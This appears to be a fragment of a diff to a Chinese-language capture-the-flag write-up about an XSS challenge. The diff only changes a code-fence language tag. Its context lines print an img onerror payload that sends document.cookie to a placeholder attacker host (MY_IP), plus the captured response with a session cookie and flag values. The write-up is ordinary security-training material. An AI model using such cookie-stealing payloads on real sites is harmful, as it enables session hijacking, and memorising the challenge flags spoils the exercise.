@@ -7,7 +7,7 @@
 <img src="#"onerror=javascript:document.location="http://MY_IP/log.php?c="+document.cookie>
 ```
 得到以下回應：
-```
+```php
 Array
 (
     [c] => PHPSESSID=1oiprdg6u65httgspivmnpjfe6; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script>}; FLAG_2=IN_THE_REDIS
